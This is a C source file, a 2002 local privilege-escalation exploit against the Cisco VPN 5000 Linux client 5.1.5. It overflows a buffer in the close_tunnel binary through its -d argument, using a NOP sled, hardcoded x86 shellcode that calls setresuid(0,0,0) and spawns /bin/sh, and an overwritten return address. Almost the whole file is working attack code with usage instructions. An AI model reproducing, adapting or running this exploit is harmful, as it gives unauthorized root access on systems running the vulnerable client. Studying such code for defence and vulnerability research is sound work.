/*
 * Cisco VPN 5000 Linux client version 5.1.5 local root exploit 
 *
 * By zillion[at]safemode.org 09/2002 
 * 
 * Greets to the 0dd people ;p
 *
 */

#include <unistd.h>
#include <sys/stat.h>
#include <string.h>

#define BUFFER_SIZE 2504
#define NOP 0x90
#define RET 0xbffff0e0

char shellcode[]=

        /* setresuid(0,0,0) &&  execve("/bin/sh",["/bin/sh"],0); */
        "\xeb\x26\x5e\x31\xc0\x89\xc3\x89\xc1\x89\xc2\xb0\xa4\xcd\x80"
        "\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xd5\xff\xff\xff"
        "\x2f\x62\x69\x6e\x2f\x73\x68";

void print_error(char * burb) { 
        printf(" Error: %s !\n",burb); exit(0); 
}

void usage(char *progname) {
        printf("\nDefault: %s  -f /path/to/close_tunnel",progname);
        printf("\nOption : %s  -o <offset>\n\n",progname);
        exit(0);
}

int main(int argc, char **argv){

char buffer[BUFFER_SIZE];
char file[30];
long retaddress;
int arg,offset=600;

struct stat sbuf;

if(argc < 2) { usage(argv[0]); }

while ((arg = getopt (argc, argv, "f:o:")) != -1){ 
      switch (arg){ 
      case 'f': 
        strncpy(file,optarg,sizeof(file));
        if(stat(argv[2], &sbuf)) { print_error("No such file");}
        break; 
      case 'o':       
        offset = atoi(optarg);
        if(offset < 0) { print_error("Offset must be positive");}
        break; 
      default :       
        usage(argv[0]); 
     } 
} 

retaddress = (RET - offset);
memset(buffer,NOP,BUFFER_SIZE);
memcpy(buffer + BUFFER_SIZE - (sizeof(shellcode) + 8) ,shellcode,sizeof(shellcode) -1);

/* Overwrite EBP and EIP */
*(long *)&buffer[BUFFER_SIZE - 8]  = retaddress;
*(long *)&buffer[BUFFER_SIZE - 4]  = retaddress;

if(execl(file,file,"-d",buffer,NULL) != 0) {
        print_error("Could not execute file");
}

return 0;

}



